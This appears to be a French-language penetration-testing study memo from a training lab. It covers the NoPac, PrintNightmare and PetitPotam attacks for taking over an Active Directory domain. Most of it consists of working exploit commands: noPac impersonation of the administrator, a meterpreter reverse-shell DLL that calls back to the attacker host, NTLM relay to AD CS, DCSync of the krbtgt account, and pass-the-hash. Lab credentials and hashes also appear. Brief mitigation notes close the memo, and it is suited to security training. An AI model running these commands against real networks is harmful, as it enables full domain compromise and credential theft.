# Mémo — Bleeding Edge Vulnerabilities (NoPac / PrintNightmare / PetitPotam)

> 3 attaques récentes (2021) menant à la **compromission du domaine** rapidement.
> Contexte : patch management souvent lent → quick win. ⚠️ Risque réel (ex. PrintNightmare peut **crasher le spooler**).
> Domaine : `INLANEFREIGHT.LOCAL`. DC : `172.16.5.5`. Attack host Linux : `172.16.5.225` (ATTACK01). User de départ : `forend:Klmcargo2`.

| Attaque | Auth requise | Résultat |
|---------|--------------|----------|
| **NoPac** (SamAccountName Spoofing) | standard domain user | SYSTEM sur le DC |
| **PrintNightmare** | standard domain user | SYSTEM sur le DC (RCE via spooler) |
| **PetitPotam** (MS-EFSRPC) | **AUCUNE** (unauth) | compromission domaine via AD CS |

---

## 1. NoPac — SamAccountName Spoofing (CVE-2021-42278 + 42287)

**Idée** : renommer le SamAccountName d'un compte machine qu'on crée pour qu'il matche celui d'un **DC**, puis demander des tickets → le KDC émet des TGS au nom du DC → accès SYSTEM.
- **42278** = bypass de la validation SAM.
- **42287** = faille dans le **PAC** Kerberos (ADDS).
- Repose sur : **ms-DS-MachineAccountQuota = 10** (un user peut créer jusqu'à 10 machines). ⚠️ Si un admin l'a mis à **0** → attaque échoue (bonne mitigation).

Outil : `/opt/noPac` sur ATTACK01.
```bash
# 1. Scanner (vérifier vulnérabilité + obtenir un TGT)
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
# → "Current ms-DS-MachineAccountQuota = 10" + "Got TGT" = vulnérable

# 2a. Shell SYSTEM sur le DC (impersonate administrator)
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

# 2b. Direct DCSync (plutôt qu'un shell)
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```
> ⚠️ **OPSEC** : le `-shell` passe par **smbexec.py** → crée les services **BTOBTO / BTOBO** + un `execute.bat` sur SMB → **détecté par Defender** (`VirTool:Win32/MSPSEexecCommand`). Les commandes échouent si AV actif. Bruyant.
> Le TGT est sauvé en **`.ccache`** sur disque (ex. `administrator_DC01...ccache`) → à nettoyer (pass-the-ticket possible ensuite).

---

## 2. PrintNightmare (CVE-2021-34527 + CVE-2021-1675)

**Idée** : faille du service **Print Spooler** (présent sur tous les Windows) → priv esc + RCE. Ici : SYSTEM shell sur un DC Server 2019.
Exploit : **cube0x0** (nécessite **sa version d'Impacket**).
```bash
# setup (déjà fait sur ATTACK01)
git clone https://github.com/cube0x0/CVE-2021-1675.git
pip3 uninstall impacket ; git clone https://github.com/cube0x0/impacket ; cd impacket ; python3 ./setup.py install

# 1. vérifier que MS-RPRN / MS-PAR sont exposés
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

# 2. générer un payload DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

# 3. héberger la DLL sur un partage SMB
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

# 4. (dans msfconsole) multi/handler
#    use exploit/multi/handler ; set PAYLOAD windows/x64/meterpreter/reverse_tcp ; set LHOST 172.16.5.225 ; set LPORT 8080 ; run

# 5. lancer l'exploit (chemin UNC vers la DLL à la fin)
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
# → le DC exécute la DLL → session meterpreter SYSTEM
```

---

## 3. PetitPotam — MS-EFSRPC (CVE-2021-36942)

**Idée** : LSA spoofing → **coercer un DC** à s'authentifier (NTLM over 445) vers notre host, puis **relayer** cette auth vers l'**AD CS Web Enrollment** pour obtenir un **certificat** pour le compte machine du DC → TGT → **DCSync**. **Aucune auth requise** au départ.

```bash
# Fenêtre 1 : relayer vers la Web Enrollment du CA (template DomainController ou KerberosAuthentication)
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

# Fenêtre 2 : coercer le DC (PetitPotam.py <ATTACK_IP> <DC_IP>)
python3 PetitPotam.py 172.16.5.225 172.16.5.5
# → "Attack worked!" ; la fenêtre 1 capture le certificat base64 du compte ACADEMY-EA-DC01$
```
> Variantes du trigger : `PetitPotam.exe` (Windows), Mimikatz `misc::efs /server:<DC> /connect:<ATTACK>`, `Invoke-PetitPotam.ps1`.

### Exploiter le certificat (Linux) — TGT puis DCSync
```bash
# TGT via le cert (PKINITtools)
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <CERT_B64> dc01.ccache
# → note l'"AS-REP encryption key" (servira pour getnthash)

export KRB5CCNAME=dc01.ccache

# DCSync avec le TGT (-k -no-pass)
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

### Variante : récupérer le NT hash du DC (U2U) puis DCSync par hash
```bash
python3 /opt/PKINITtools/getnthash.py -key <AS-REP_KEY> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
# → Recovered NT Hash: 313b6f...
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3b...:313b6f...
```

### Confirmer l'accès (hash admin récupéré)
```bash
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
# → (Pwn3d!)
```

### Variante Windows — Rubeus PTT + Mimikatz DCSync
```powershell
# depuis MS01, avec le cert base64
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<CERT_B64> /ptt
klist                                   # confirmer le TGT en mémoire
# DCSync (le DC a les droits de réplication) → récupérer le krbtgt (→ Golden Ticket)
.\mimikatz.exe
lsadump::dcsync /user:inlanefreight\krbtgt
```

---

## 4. Mitigations PetitPotam / AD CS

- Appliquer le patch **CVE-2021-36942**.
- Anti NTLM relay : **Extended Protection for Authentication** + **Require SSL** (HTTPS) sur la Web Enrollment du CA.
- Désactiver **NTLM** : sur les DC, sur les serveurs AD CS (GPO), pour **IIS** sur AD CS.
- 📄 Lire **"Certified Pre-Owned"** : le patch seul **ne suffit pas** — un user standard peut encore attaquer AD CS via des API authentifiées.

---

## 5. À retenir

| Attaque | Commande clé | Garde-fou / détection |
|---------|-------------|----------------------|
| **NoPac** | `scanner.py` puis `noPac.py ... --impersonate administrator` | `MachineAccountQuota=0` bloque ; smbexec = Defender + `.ccache` sur disque |
| **PrintNightmare** | `CVE-2021-1675.py user:pass@DC '\\ATTACK\share\payload.dll'` | désactiver le spooler sur les DC ; risque de crash spooler |
| **PetitPotam** | `ntlmrelayx.py --adcs --template DomainController` + `PetitPotam.py ATTACK DC` | patch 36942 + Extended Protection/Require SSL + disable NTLM |
| Cert → domaine (Linux) | `gettgtpkinit.py` → `KRB5CCNAME` → `secretsdump.py -k -no-pass` | — |
| Cert → domaine (Windows) | `Rubeus asktgt /certificate /ptt` → `lsadump::dcsync` | — |
| Confirmer | `crackmapexec smb <DC> -u administrator -H <hash>` → `Pwn3d!` | — |
